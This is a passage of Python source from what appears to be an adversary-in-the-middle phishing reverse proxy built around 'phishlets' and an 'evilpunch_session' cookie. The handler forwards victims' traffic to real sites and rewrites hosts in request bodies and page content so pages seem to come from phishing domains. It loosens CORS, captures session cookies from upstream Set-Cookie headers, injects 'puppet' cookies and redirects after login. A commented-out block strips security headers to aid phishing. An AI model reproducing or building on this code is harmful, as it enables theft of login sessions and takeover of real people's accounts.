            if matching_phishlet and matching_phishlet.get('data'):
                from .helpers import apply_reverse_filter_to_request_body
                original_request_data = request_data
                request_data = apply_reverse_filter_to_request_body(
                    request_data, 
                    matching_phishlet['data'], 
                    matching_phishlet['proxy_domain']
                )
                if request_data != original_request_data:
                    debug_log(f"✅ Applied reverse filter to request body", "INFO")
                    debug_log(f"   Original size: {len(original_request_data)} bytes", "DEBUG")
                    debug_log(f"   Modified size: {len(request_data)} bytes", "DEBUG")
                else:
                    debug_log(f"⏭️  No reverse filter changes needed for request body", "DEBUG")
            
            # Ensure headers reflect any body modifications (e.g., via force_post_data)
            try:
                mutable_forward_headers = dict(forward_headers)
            except Exception:
                mutable_forward_headers = dict(forward_headers)
            # Remove hop-by-hop headers that conflict with a fixed body length
            mutable_forward_headers.pop('Transfer-Encoding', None)
            
            # Only set Content-Length for methods that typically have a body
            if request.method in ['POST', 'PUT', 'PATCH', 'DELETE']:
                try:
                    mutable_forward_headers['Content-Length'] = str(len(request_data) if request_data else 0)
                except Exception:
                    pass
            else:
                # Remove Content-Length for GET requests to avoid confusion
                mutable_forward_headers.pop('Content-Length', None)

            # Add puppet cookies to headers if they exist
            # 
            
            # Prepare request parameters
            request_kwargs = {
                'method': request.method,
                'url': target_url,
                'headers': mutable_forward_headers,
                'allow_redirects': False,
                'ssl': True,
                'auto_decompress': True,
                'timeout': 30,  # Add timeout to prevent hanging requests
                'verify_ssl': False,  # Disable SSL verification for consistency
            }
            
            # Only add data parameter for methods that typically have a body
            # This prevents aiohttp from automatically adding Content-Type: application/octet-stream
            if request.method in ['POST', 'PUT', 'PATCH', 'DELETE'] and request_data:
                request_kwargs['data'] = request_data
            elif request_data and request.method == 'GET':
                # For GET requests with data, we need to handle it differently
                # Convert to query parameters or handle as needed
                debug_log(f"GET request with data detected, data length: {len(request_data)}", "DEBUG")
                # For now, we'll skip adding the data to avoid the Content-Type issue
                # This might need to be handled differently based on your specific use case
            
            # Add proxy configuration if available
            if proxy_config and proxy_config['type'] in ['http', 'https']:
                # For aiohttp, we need to use the proxy URL format
                proxy_url = proxy_config['url']
                request_kwargs['proxy'] = proxy_url
                debug_log(f"Adding proxy to request: {proxy_url}", "DEBUG")
                debug_log(f"Full request kwargs: {request_kwargs}", "DEBUG")
                
                # Also add proxy_auth if username/password are provided
                if proxy_config.get('username') and proxy_config.get('password'):
                    from aiohttp import BasicAuth
                    request_kwargs['proxy_auth'] = BasicAuth(
                        proxy_config['username'], 
                        proxy_config['password']
                    )
                    debug_log(f"Added proxy authentication for user: {proxy_config['username']}", "DEBUG")
            else:
                debug_log("No proxy configuration available for this request", "DEBUG")
            
            # ===== COMPREHENSIVE DEBUG LOGGING FOR FINAL REQUEST =====
            # debug_log("🚀🚀🚀🚀🚀🚀 FINAL REQUEST DEBUG INFO 🚀🚀🚀🚀🚀🚀", "INFO")
            # debug_log("=" * 80, "INFO")
            
            # # 1. Request Method and URL
            # debug_log(f"📋 REQUEST METHOD: {request.method}", "INFO")
            # debug_log(f"🌐 TARGET URL: {target_url}", "INFO")
            # debug_log(f"🔗 FULL REQUEST URL: {request_kwargs.get('url', 'N/A')}", "INFO")
            
            # # 2. Request Headers (Key Headers Only)
            # headers = request_kwargs.get('headers', {})
            # debug_log(f"📝 REQUEST HEADERS ({len(headers)} total):", "INFO")
            # key_headers = ['Host', 'User-Agent', 'Accept', 'Accept-Encoding', 'Accept-Language', 
            #               'Content-Type', 'Content-Length', 'Authorization', 'Cookie', 'Referer', 
            #               'Origin', 'X-Forwarded-For', 'X-Real-IP']
            
            # for header_name in key_headers:
            #     if header_name in headers:
            #         value = headers[header_name]
            #         # Truncate long values for readability
            #         if isinstance(value, str) and len(value) > 100:
            #             value = value[:100] + "... (truncated)"
            #         debug_log(f"   {header_name}: {value}", "INFO")
            
            # # Show count of other headers
            # other_headers = [h for h in headers.keys() if h not in key_headers]
            # if other_headers:
            #     debug_log(f"   ... and {len(other_headers)} other headers: {', '.join(other_headers[:5])}{'...' if len(other_headers) > 5 else ''}", "INFO")
            
            # # 3. Request Body Information
            # request_data = request_kwargs.get('data')
            # if request_data:
            #     debug_log(f"📦 REQUEST BODY:", "INFO")
            #     debug_log(f"   Size: {len(request_data)} bytes", "INFO")
            #     debug_log(f"   Type: {type(request_data).__name__}", "INFO")
                
            #     # Try to show content preview for text data
            #     if isinstance(request_data, bytes):
            #         try:
            #             preview = request_data[:200].decode('utf-8')
            #             if len(request_data) > 200:
            #                 preview += "... (truncated)"
            #             debug_log(f"   Preview: {preview}", "INFO")
            #         except UnicodeDecodeError:
            #             debug_log(f"   Preview: [Binary data - {len(request_data)} bytes]", "INFO")
            #     elif isinstance(request_data, str):
            #         preview = request_data[:200]
            #         if len(request_data) > 200:
            #             preview += "... (truncated)"
            #         debug_log(f"   Preview: {preview}", "INFO")
            # else:
            #     debug_log(f"📦 REQUEST BODY: None", "INFO")
            
            # # 4. Proxy Configuration Details
            # if proxy_config:
            #     debug_log(f"🔀 PROXY CONFIGURATION:", "INFO")
            #     debug_log(f"   Type: {proxy_config.get('type', 'N/A')}", "INFO")
            #     debug_log(f"   URL: {proxy_config.get('url', 'N/A')}", "INFO")
            #     debug_log(f"   Host: {proxy_config.get('host', 'N/A')}", "INFO")
            #     debug_log(f"   Port: {proxy_config.get('port', 'N/A')}", "INFO")
            #     if proxy_config.get('username'):
            #         debug_log(f"   Username: {proxy_config.get('username', 'N/A')}", "INFO")
            #         debug_log(f"   Password: {'*' * len(proxy_config.get('password', '')) if proxy_config.get('password') else 'N/A'}", "INFO")
            # else:
            #     debug_log(f"🔀 PROXY CONFIGURATION: None (Direct Connection)", "INFO")
            
            # # 5. Request Parameters Summary
            # debug_log(f"⚙️  REQUEST PARAMETERS:", "INFO")
            # debug_log(f"   Allow Redirects: {request_kwargs.get('allow_redirects', 'N/A')}", "INFO")
            # debug_log(f"   SSL Verification: {request_kwargs.get('ssl', 'N/A')}", "INFO")
            # debug_log(f"   Verify SSL: {request_kwargs.get('verify_ssl', 'N/A')}", "INFO")
            # debug_log(f"   Auto Decompress: {request_kwargs.get('auto_decompress', 'N/A')}", "INFO")
            # debug_log(f"   Timeout: {request_kwargs.get('timeout', 'N/A')} seconds", "INFO")
            
            # # 5.1. Request Type Information
            # session_cookie = request.get('session_cookie')
            # url_path = str(request.rel_url)
            # proxy_auth_path = matching_phishlet.get('proxy_auth', '') if matching_phishlet else ''
            # is_proxy_auth_request = url_path == proxy_auth_path
            # debug_log(f"🔍 REQUEST TYPE ANALYSIS:", "INFO")
            # debug_log(f"   URL Path: {url_path}", "INFO")
            # debug_log(f"   Proxy Auth Path: {proxy_auth_path}", "INFO")
            # debug_log(f"   Is Proxy Auth Request: {is_proxy_auth_request}", "INFO")
            # debug_log(f"   Has Session Cookie: {bool(session_cookie)}", "INFO")
            # debug_log(f"   Session Cookie: {session_cookie[:8] + '...' if session_cookie else 'None'}", "INFO")
            
            # # 6. Phishlet Information
            # if matching_phishlet:
            #     debug_log(f"🎣 PHISHLET INFORMATION:", "INFO")
            #     debug_log(f"   Name: {matching_phishlet.get('name', 'N/A')}", "INFO")
            #     debug_log(f"   Proxy Domain: {matching_phishlet.get('proxy_domain', 'N/A')}", "INFO")
            #     debug_log(f"   Target URL: {matching_phishlet.get('target_url', 'N/A')}", "INFO")
            #     hosts_count = len(matching_phishlet.get('hosts_to_proxy', []))
            #     debug_log(f"   Hosts to Proxy: {hosts_count} configured", "INFO")
            # else:
            #     debug_log(f"🎣 PHISHLET INFORMATION: None", "INFO")
            
            # # 7. Session Information
            # debug_log(f"🔧 SESSION INFORMATION:", "INFO")
            # debug_log(f"   Session Type: {type(session).__name__}", "INFO")
            # debug_log(f"   Session Closed: {session.closed}", "INFO")
            
            # debug_log("=" * 80, "INFO")
            # debug_log("🚀🚀🚀🚀🚀🚀 END FINAL REQUEST DEBUG INFO 🚀🚀🚀🚀🚀🚀", "INFO")
            debug_log("", "INFO")  # Empty line for readability
            
            # Record start time for request timing
            import time
            request_start_time = time.time()
            debug_log(f"⏱️  REQUEST START TIME: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(request_start_time))}", "INFO")
            
            async with session.request(**request_kwargs) as resp:
                # Calculate request duration
                request_end_time = time.time()
                request_duration = request_end_time - request_start_time
                
                debug_log("---------🍄🍄🍄🍄🍄🍄 responce started 🍄🍄🍄🍄🍄🍄------", "INFO")
                debug_log(f"⏱️  REQUEST DURATION: {request_duration:.3f} seconds", "INFO")
                debug_log(f"⏱️  REQUEST END TIME: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(request_end_time))}", "INFO")
                debug_log(f"Upstream response status: {resp.status}", "INFO")
                
                # Call puppet response hook (async)
                await puppet_onresponse(resp)
                
                if proxy_config:
                    debug_log(f"✅ Request completed through proxy: {proxy_config['url']}", "INFO")
                else:
                    debug_log("✅ Request completed directly (no proxy)", "INFO")
                # Enhanced response debug information
                debug_log("📥 RESPONSE DEBUG INFO:", "INFO")
                debug_log(f"   Status Code: {resp.status}", "INFO")
                debug_log(f"   Reason: {resp.reason}", "INFO")
                debug_log(f"   Content-Type: {resp.headers.get('Content-Type', 'N/A')}", "INFO")
                debug_log(f"   Content-Length: {resp.headers.get('Content-Length', 'N/A')}", "INFO")
                debug_log(f"   Server: {resp.headers.get('Server', 'N/A')}", "INFO")
                debug_log(f"   Date: {resp.headers.get('Date', 'N/A')}", "INFO")
                
                # Show count of response headers
                response_headers_count = len(resp.headers)
                debug_log(f"   Total Response Headers: {response_headers_count}", "INFO")
                
                # Show Link header count specifically
                link_headers = resp.headers.getall('Link', [])
                debug_log(f"   Link Headers Count: {len(link_headers)}", "INFO")
                if link_headers:
                    debug_log(f"   Link Headers: {link_headers}", "DEBUG")
                
                # debug_log(f"Upstream response headers: {dict(resp.headers)}", "DEBUG")  # Commented out to reduce noise
                
                # Debug: Log static file response details
                if is_static_file:
                    content_type = resp.headers.get('Content-Type', 'N/A')
                    content_length = resp.headers.get('Content-Length', 'N/A')
                    debug_log(f"📦 STATIC FILE RESPONSE:", "INFO")
                    debug_log(f"   Content-Type: {content_type}", "INFO")
                    debug_log(f"   Content-Length: {content_length}", "INFO")
                    debug_log(f"   Status: {resp.status}", "INFO")
                    if content_length != 'N/A':
                        try:
                            size_kb = int(content_length) / 1024
                            debug_log(f"   Size: {size_kb:.1f} KB", "INFO")
                        except (ValueError, TypeError):
                            pass

                # Check if content type is text-based and should have replacements applied
                content_type = resp.headers.get('Content-Type', '').lower()
                should_apply_replacements = False
                
                # Only apply replacements for text-based content types
                if any(text_type in content_type for text_type in [
                    'text/html', 'text/plain', 'text/css', 'text/javascript',
                    'application/json', 'application/javascript', 'application/xml',
                    'text/xml', 'application/xhtml+xml', 'text/x-javascript',
                    'application/x-javascript', 'text/ecmascript', 'application/ecmascript',
                    'text/vbscript', 'application/x-httpd-php', 'text/php',
                    'text/asp', 'text/asp', 'text/perl', 'text/python',
                    'text/sql', 'text/yaml', 'text/markdown', 'text/csv',
                    'application/x-yaml', 'application/x-csv', 'application/x-www-form-urlencoded',
                    'text/x-asm', 'text/x-c', 'text/x-c++', 'text/x-java',
                    'text/x-pascal', 'text/x-script', 'text/x-script.phyton',
                    'text/x-script.rexx', 'text/x-script.tcl', 'text/x-script.tcsh',
                    'text/x-script.zsh', 'text/x-server-parsed-html', 'text/x-setext',
                    'text/x-sgml', 'text/x-speech', 'text/x-uuencode', 'text/x-vcalendar',
                    'text/x-vcard', 'text/xml-external-parsed-entity'
                ]):
                    should_apply_replacements = True
                    debug_log(f"✅ Content type '{content_type}' supports replacements", "DEBUG")
                else:
                    debug_log(f"⏭️  Content type '{content_type}' - skipping replacements (binary/non-text)", "DEBUG")
                
                # === STATIC FILE CACHING ===
                # Check if this is a cacheable static file
                should_cache = False
                cache_file_path = None
                metadata_file_path = None
                
                if (CACHE_ENABLED and 
                    matching_phishlet and 
                    matching_phishlet.get('name') and
                    matching_phishlet.get('is_cache_enabled', True) and  # Check phishlet-specific cache setting
                    _is_cacheable_file(url_path, content_type)):
                    
                    should_cache = True
                    phishlet_name = matching_phishlet['name']
                    
                    # Generate cache paths
                    cache_paths = _get_cache_path(phishlet_name, url_path, target_host)
                    if cache_paths:
                        cache_file_path, metadata_file_path = cache_paths
                        
                        # Check if we have a valid cached version
                        if cache_file_path and metadata_file_path:
                            cached_content = _read_from_cache(cache_file_path, metadata_file_path)
                            if cached_content:
                                cached_bytes, cached_metadata = cached_content
                                
                                # Check if cached content is still valid
                                if _is_cache_valid(cached_metadata):
                                    debug_log(f"🎯 Serving from cache: {url_path} ({len(cached_bytes)} bytes)", "INFO")
                                    
                                    # Create basic headers for cached response
                                    # We need to create headers that would normally come from the upstream response
                                    cached_headers = {
                                        'Content-Type': content_type,
                                        'Cache-Control': 'public, max-age=3600',
                                        'Content-Length': str(len(cached_bytes))
                                    }
                                    
                                    # Add any additional headers that might be needed
                                    if 'text/html' in content_type:
                                        cached_headers['Content-Type'] = 'text/html; charset=utf-8'
                                    elif 'text/css' in content_type:
                                        cached_headers['Content-Type'] = 'text/css; charset=utf-8'
                                    elif 'application/javascript' in content_type:
                                        cached_headers['Content-Type'] = 'application/javascript; charset=utf-8'
                                    
                                    # Create response with cached content
                                    response = web.Response(
                                        body=cached_bytes,
                                        status=200,
                                        headers=cached_headers
                                    )
                                    
                                    # Add session cookie if we have session info
                                    if hasattr(request, 'get') and request.get('session_cookie'):
                                        session_cookie = request['session_cookie']
                                        phishlet_id = request.get('phishlet_id')
                                        proxy_domain = request.get('proxy_domain', '')
                                        
                                        # Set cookie with appropriate attributes
                                        cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
                                        
                                        # Set cookie domain to base domain for cross-subdomain access
                                        base_domain = proxy_domain
                                        if '.' in base_domain:
                                            base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
                                        
                                        response.set_cookie(
                                            cookie_name,
                                            session_cookie,
                                            max_age=31536000,  # 1 year
                                            httponly=True,
                                            secure=False,
                                            samesite='Lax',
                                            domain=f'.{base_domain}'
                                        )
                                        debug_log(f"Added session cookie to cached response: {cookie_name} = {session_cookie[:8]}...", "DEBUG")
                                    
                                    return response
                                else:
                                    debug_log(f"⚠️  Cached file expired or invalid: {url_path}", "DEBUG")
                                    # Remove invalid cache files
                                    try:
                                        if cache_file_path.exists():
                                            cache_file_path.unlink()
                                        if metadata_file_path.exists():
                                            metadata_file_path.unlink()
                                        debug_log(f"Removed invalid cache files for: {url_path}", "DEBUG")
                                    except Exception as e:
                                        debug_log(f"Error removing invalid cache files: {e}", "DEBUG")
                            else:
                                debug_log(f"⏭️  Cache miss for: {url_path}", "DEBUG")
                                _cache_stats['misses'] += 1
                        else:
                            debug_log(f"⚠️  Could not generate cache paths for: {url_path}", "DEBUG")
                    else:
                        debug_log(f"⚠️  Could not generate cache paths for: {url_path}", "DEBUG")
                else:
                    if not CACHE_ENABLED:
                        debug_log(f"⏭️  Caching disabled globally for: {url_path}", "DEBUG")
                    elif not matching_phishlet or not matching_phishlet.get('name'):
                        debug_log(f"⏭️  No phishlet info for caching: {url_path}", "DEBUG")
                    elif not matching_phishlet.get('is_cache_enabled', True):
                        debug_log(f"⏭️  Caching disabled for phishlet '{matching_phishlet.get('name', 'unknown')}' for: {url_path}", "DEBUG")
                    elif not _is_cacheable_file(url_path, content_type):
                        debug_log(f"⏭️  File not cacheable: {url_path} (type: {content_type})", "DEBUG")
                
                debug_log(f"Cache decision for {url_path}: {'CACHE' if should_cache else 'NO_CACHE'}", "DEBUG")
                # === END STATIC FILE CACHING ===
                # print(f"\n ---- resp.headers: {resp.headers}--------\n --------------------------------")
                # Patch response headers
                patched_headers = patch_headers_in(resp.headers, incoming_host, target_host)
                # print(f"\n ---- patched_headers: {patched_headers}--------\n --------------------------------")
                
                for h in ("content-length", "Content-Length", "content-encoding", "Content-Encoding"):
                    if h in patched_headers:
                        del patched_headers[h]
                if "content-type" not in patched_headers and "Content-Type" not in patched_headers:
                    patched_headers["Content-Type"] = "text/html; charset=utf-8"
                
                # debug_log(f"Patched response headers: {dict(patched_headers)}", "DEBUG")  # Commented out to reduce noise

                # === CORS AND SECURITY HEADER PROCESSING ===
                # Handle CORS headers before sending response to browser
                allow_origin = patched_headers.get("Access-Control-Allow-Origin")
                if allow_origin and allow_origin != "*":
                    try:
                        from urllib.parse import urlparse
                        u = urlparse(allow_origin)
                        if u.hostname:
                            # Replace the host with phished domain if possible
                            # This is a simplified version - you may need to implement replaceHostWithPhished logic
                            if matching_phishlet and matching_phishlet.get('proxy_domain'):
                                # For now, just use the proxy domain as the new origin
                                new_origin = f"{u.scheme}://{matching_phishlet['proxy_domain']}"
                                patched_headers["Access-Control-Allow-Origin"] = new_origin
                                debug_log(f"Modified CORS origin: {allow_origin} -> {new_origin}", "DEBUG")
                            else:
                                debug_log(f"Could not modify CORS origin: {allow_origin} - no phishlet info", "DEBUG")
                        else:
                            debug_log(f"Could not parse URL from CORS header: {allow_origin}", "WARN")
                    except Exception as e:
                        debug_log(f"Error parsing CORS header '{allow_origin}': {e}", "WARN")
                    
                    # Set credentials to true for CORS requests
                    patched_headers["Access-Control-Allow-Credentials"] = "true"
                    debug_log("Set Access-Control-Allow-Credentials to true", "DEBUG")
                else:
                    # set to *
                    patched_headers["Access-Control-Allow-Origin"] = "*"
                    debug_log("Set Access-Control-Allow-Origin to *", "DEBUG")
                # Remove security headers that might interfere with phishing
                # security_headers_to_remove = [
                #         "content-security-policy",
                #         "content-security-policy-report-only", 
                #         "strict-transport-security",
                #         "x-xss-protection",
                #         "x-content-type-options",
                #         "x-frame-options",
                #     ]
                
                # for header in list(patched_headers.keys()):
                #     if header.lower() in security_headers_to_remove:
                #         del patched_headers[header]
                #         debug_log(f"Removed security header: {header}", "DEBUG")
                
                debug_log("CORS and security header processing completed", "DEBUG")
                # === END CORS AND SECURITY HEADER PROCESSING ===

                # === REDIRECT LOGIC PROCESSING ===
                # Check if redirect conditions are met based on phishlet configuration
                if matching_phishlet and matching_phishlet.get('data'):
                    phishlet_data = matching_phishlet['data']
                    redirect_on_host = phishlet_data.get('redirect_on_host', '').strip()
                    redirect_on_url = phishlet_data.get('redirect_on_url', '').strip()
                    after_login_url = phishlet_data.get('after_login_url', '').strip()
                    
                    if redirect_on_host and redirect_on_url and after_login_url:
                        # Check if current request matches the redirect conditions
                        current_host = target_host.strip().lower()
                        current_url = str(request.rel_url).strip()
                        
                        debug_log(f"Checking redirect conditions:", "DEBUG")
                        debug_log(f"  redirect_on_host: '{redirect_on_host}' vs current_host: '{current_host}'", "DEBUG")
                        debug_log(f"  redirect_on_url: '{redirect_on_url}' vs current_url: '{current_url}'", "DEBUG")
                        
                        # Check if host and URL match (case-insensitive)
                        host_matches = redirect_on_host.lower() == current_host
                        url_matches = redirect_on_url.lower() == current_url.lower()
                        
                        if host_matches and url_matches:
                            debug_log(f"✅ Redirect conditions met! Redirecting to: {after_login_url}", "INFO")
                            
                            # Create redirect response
                            redirect_response = web.HTTPFound(after_login_url)
                            
                            # Add session cookie if we have session info
                            if hasattr(request, 'get') and request.get('session_cookie'):
                                session_cookie = request['session_cookie']
                                phishlet_id = request.get('phishlet_id')
                                proxy_domain = request.get('proxy_domain', '')
                                
                                # Set cookie with appropriate attributes and phishlet-specific name
                                cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
                                
                                # Set cookie domain to base domain for cross-subdomain access
                                base_domain = proxy_domain
                                if '.' in base_domain:
                                    base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
                                
                                redirect_response.set_cookie(
                                    cookie_name,
                                    session_cookie,
                                    max_age=31536000,  # 1 year
                                    httponly=True,
                                    secure=False,
                                    samesite='Lax',
                                    domain=f'.{base_domain}'
                                )
                                debug_log(f"Added session cookie to redirect response: {cookie_name} = {session_cookie[:8]}...", "DEBUG")
                            
                            return redirect_response
                        else:
                            debug_log(f"⏭️  Redirect conditions not met - continuing with normal response", "DEBUG")
                    else:
                        debug_log(f"⏭️  No redirect configuration found in phishlet data", "DEBUG")
                else:
                    debug_log(f"⏭️  No phishlet data available for redirect check", "DEBUG")
                # === END REDIRECT LOGIC PROCESSING ===

                # Check if client is still connected before preparing response
                if request.transport and request.transport.is_closing():
                    debug_log("Client disconnected before response preparation", "WARN")
                    return web.Response(status=499)  # Client Closed Request
                

                try:
                    # CRITICAL FIX: Build replacement mapping ONLY from the current phishlet, not from all phishlets
                    # This ensures that replacements are scoped to the specific phishlet being used
                    
                    if matching_phishlet:
                        # Use ONLY the current phishlet's configuration for replacements
                        current_phishlet_data = matching_phishlet['data'] if isinstance(matching_phishlet.get('data'), dict) else {}
                        current_hosts_to_proxy = current_phishlet_data.get('hosts_to_proxy', [])
                        
                        debug_log(f"Building replacement map from current phishlet: {matching_phishlet['name']}", "DEBUG")
                        
                        # Build local_map from current phishlet only
                        local_map = {}
                        
                        # Add subdomain mappings from current phishlet first
                        for entry in current_hosts_to_proxy:
                            if isinstance(entry, dict):
                                original_host = entry.get('host', '').strip()
                                proxy_sub = entry.get('proxy_subdomain', '').strip()
                                
                                if original_host and proxy_sub:
                                    # Build the proxy hostname
                                    proxy_host = f"{proxy_sub}.{matching_phishlet['proxy_domain']}"
                                    local_map[original_host] = proxy_host
                                    debug_log(f"  Subdomain mapping from current phishlet: {original_host} -> {proxy_host}", "DEBUG")
                        
                        # Add main target mapping LAST - this should be processed after all subdomains
                        local_map[target_host] = incoming_host
                        debug_log(f"  Main target mapping (added last): {target_host} -> {incoming_host}", "DEBUG")
                        
                        # Filter replacements will be processed after content replacements
                        
                        # Use only the current phishlet's mappings
                        filtered_map = local_map
                        
                        debug_log(f"Using ONLY current phishlet mappings: {len(filtered_map)} entries", "DEBUG")
                    else:
                        # Fallback to old logic if no phishlet found (shouldn't happen in normal operation)
                        debug_log("No matching phishlet found, using fallback replacement logic", "WARN")
                        
                        # Build a minimal fallback map
                        filtered_map = {target_host: incoming_host}
                        debug_log(f"Using fallback mapping: {target_host} -> {incoming_host}", "DEBUG")
                    
                    # Create ordered replacements using helper function
                    ordered_replacements = create_ordered_replacements(filtered_map, target_host, debug_log)
                    
                    debug_log("=== END REQUEST SETUP ===", "DEBUG")
                    
                    # Apply additional header replacements based on ordered_replacements using helper function
                    patched_headers = patch_response_header_2(patched_headers, ordered_replacements, debug_log)

                    max_key_len = max((len(k) for k, _ in ordered_replacements), default=0)
                    overlap = max(0, max_key_len - 1)
                    debug_log(f"Max key length: {max_key_len}, overlap: {overlap}", "DEBUG")
                    
                    # Call puppet response hook BEFORE creating the stream response
                
                    
                    # Create the stream response and handle multiple headers properly
                    stream_response = web.StreamResponse(status=resp.status)
                    
                    # Set headers individually to handle multiple values properly
                    for key, value in patched_headers.items():
                        if isinstance(value, list):
                            # Multiple values for this header (e.g., multiple Link headers)
                            for v in value:
                                stream_response.headers.add(key, v)
                            debug_log(f"Added multiple {key} headers: {len(value)} values", "DEBUG")
                        else:
                            # Single value for this header
                            stream_response.headers[key] = value
                    
                    # Capture cookies from response Set-Cookie headers and add session cookie
                    if hasattr(request, 'get') and request.get('session_cookie'):
                        session_cookie = request['session_cookie']
                        phishlet_id = request.get('phishlet_id')
                        proxy_domain = request.get('proxy_domain', '')
                        host_domain = request.headers.get('Host', '')
                        # Capture cookies from response headers
                        await capture_response_cookies(resp.headers, session_cookie, phishlet_id, proxy_domain, host_domain)
                        
                        # Set cookie with appropriate attributes and phishlet-specific name
                        cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
                        
                        # Set cookie domain to base domain for cross-subdomain access
                        base_domain = proxy_domain
                        if '.' in base_domain:
                            # For subdomains, use the base domain
                            base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
                        
                        stream_response.set_cookie(
                            cookie_name,
                            session_cookie,
                            max_age=31536000,  # 1 year
                            httponly=True,      # Prevent XSS
                            secure=False,       # Set to False for HTTP, True for HTTPS
                            samesite='Lax',     # CSRF protection
                            domain=f'.{base_domain}'  # Set to base domain for cross-subdomain access
                        )
                        debug_log(f"Added session cookie to response: {cookie_name} = {session_cookie[:8]}...", "DEBUG")
                    
                    # Inject puppet cookies using helper function from puppet.py (only if they exist)
                    # The actual cookie setting happens in puppet.py's inject_puppet_cookies function!
                    url_path = str(request.rel_url.path)
                    if get_puppet_cookies(url_path=url_path, response=resp):
                        cookies_injected = inject_puppet_cookies(stream_response, url_path=url_path, resp=resp)
                        debug_log(f"🍪 [PUPPET] Injected {cookies_injected} puppet cookies", "INFO")
                    
                    # Wrap prepare call in try-catch to handle race condition
                    try:
                        await stream_response.prepare(request)
                        debug_log("Stream response prepared", "DEBUG")
                    except Exception as prepare_error:
                        if "Cannot write to closing transport" in str(prepare_error) or "ClientConnectionResetError" in str(prepare_error):
                            debug_log("Client disconnected during response preparation", "WARN")
                            return web.Response(status=499)  # Client Closed Request
                        else:
                            debug_log(f"Response preparation error: {prepare_error}", "ERROR")
                            raise prepare_error
                    
                    

                    # Check if client is still connected before preparing response
                    if request.transport and request.transport.is_closing():
                        debug_log("Client disconnected before response preparation", "WARN")
                        return web.Response(status=499)  # Client Closed Request
                    
                    # Stream with small overlap buffer so host strings across chunk boundaries are replaced
                    tail_text: str = ""
                    chunk_count = 0
                    total_bytes = 0

                    debug_log("Starting response streaming...", "INFO")
                    
                    # Debug: Log static file streaming info
                    if is_static_file:
                        debug_log(f"🚀 STATIC FILE STREAMING STARTED: {url_path}", "INFO")
                        debug_log(f"   Chunk size: 4096 bytes", "INFO")
                        debug_log(f"   Expected content replacement: {'No' if is_static_file else 'Yes'}", "INFO")
                    
                    # === STATIC FILE CACHING - COLLECT CONTENT ===
                    # If this is a cacheable file, collect all content for caching
                    cache_content = b""
                    if should_cache and cache_file_path and metadata_file_path:
                        debug_log(f"📦 Collecting content for caching: {url_path}", "INFO")
                        # Read all content from response for caching
                        async for content_chunk in resp.content.iter_chunked(4096):
                            cache_content += content_chunk
                        
                        # Cache the collected content
                        if cache_content:
                            phishlet_name = matching_phishlet['name'] if matching_phishlet else "unknown"
                            _write_to_cache(
                                cache_file_path, 
                                cache_content, 
                                metadata_file_path, 
                                url_path, 
                                target_host, 
                                content_type, 
                                phishlet_name
                            )
                            
                            # Now stream the cached content to the client
                            debug_log(f"📤 Streaming cached content to client: {url_path} ({len(cache_content)} bytes)", "INFO")
                            
                            # Stream the cached content in chunks
                            chunk_size = 4096
                            for i in range(0, len(cache_content), chunk_size):
                                chunk = cache_content[i:i + chunk_size]
                                try:
                                    await stream_response.write(chunk)
                                except Exception as write_error:
                                    if "Cannot write to closing transport" in str(write_error):
                                        debug_log("Client disconnected during cached content streaming", "WARN")
                                        break
                                    else:
                                        raise write_error
                            
                            # Write EOF and return
                            if request.transport and not request.transport.is_closing():
                                try:
                                    await stream_response.write_eof()
                                    debug_log(f"Cached content streaming complete: {len(cache_content)} bytes", "INFO")
                                except Exception as write_error:
                                    if "Cannot write to closing transport" in str(write_error):
                                        debug_log("Client disconnected during EOF write", "WARN")
                                    else:
                                        raise write_error
                            
                            return stream_response
                    
                    # If not caching, continue with normal streaming
                    async for chunk in resp.content.iter_chunked(4096):
                        # Check if client is still connected before processing each chunk
                        if request.transport and request.transport.is_closing():
                            debug_log("Client disconnected during streaming", "WARN")
                            break
                            
                        chunk_count += 1
                        chunk_size = len(chunk)
                        total_bytes += chunk_size
                        
                        # Attempt text decode
                        text: str
                        if isinstance(chunk, bytes):
                            try:
                                text = chunk.decode('utf-8')
                            except UnicodeDecodeError:
                                # Flush any pending tail before forwarding raw bytes
                                if tail_text:
                                    try:
                                        await stream_response.write(tail_text.encode('utf-8'))
                                    except Exception as write_error:
                                        if "Cannot write to closing transport" in str(write_error):
                                            debug_log("Client disconnected during write", "WARN")
                                            break
                                        else:
                                            raise write_error
                                    tail_text = ""
                                
                                try:
                                    await stream_response.write(chunk)
                                except Exception as write_error:
                                    if "Cannot write to closing transport" in str(write_error):
                                        debug_log("Client disconnected during write", "WARN")
                                        break
                                    else:
                                        raise write_error
                                continue
                        elif isinstance(chunk, str):
                            text = chunk
                        else:
                            # Unknown type; flush tail and forward
                            if tail_text:
                                try:
                                    await stream_response.write(tail_text.encode('utf-8'))
                                except Exception as write_error:
                                    if "Cannot write to closing transport" in str(write_error):
                                        debug_log("Client disconnected during write", "WARN")
                                        break
                                    else:
                                        raise write_error
                                tail_text = ""
                            
                            try:
                                await stream_response.write(chunk)  # type: ignore[arg-type]
                            except Exception as write_error:
                                if "Cannot write to closing transport" in str(write_error):
                                    debug_log("Client disconnected during write", "WARN")
                                    break
                                else:
                                    raise write_error
                            continue

                        # Combine with tail and apply replacements
                        combined = tail_text + text
                        
                        # Check if tools.fluxxset.com exists in this chunk before replacement
                        # if 'tools.fluxxset.com' in combined:
                        #     debug_log(f"🔍 Found 'tools.fluxxset.com' in chunk {chunk_count} - will attempt replacement", "DEBUG")
                        
                        if ordered_replacements:
                            # Apply all content replacements using the helper function
                            combined, request = apply_content_replacements(
                                combined, 
                                ordered_replacements, 
                                should_apply_replacements, 
                                content_type, 
                                incoming_host, 
                                request, 
                                chunk_count, 
                                debug_log
                            )
                            
                            # Process phishlet filters after content replacements
                            if current_phishlet_data:
                                request_path = str(request.url.path)
                                filter_replacements = process_phishlet_filters(current_phishlet_data, request_path, resp.status, debug_log)
                                if filter_replacements:
                                    # Apply filter replacements directly to the content
                                    for old_text, new_text in filter_replacements.items():
                                        if old_text in combined:
                                            combined = combined.replace(old_text, new_text)
                                            debug_log(f"Applied filter replacement: '{old_text}' -> '{new_text}'", "DEBUG")
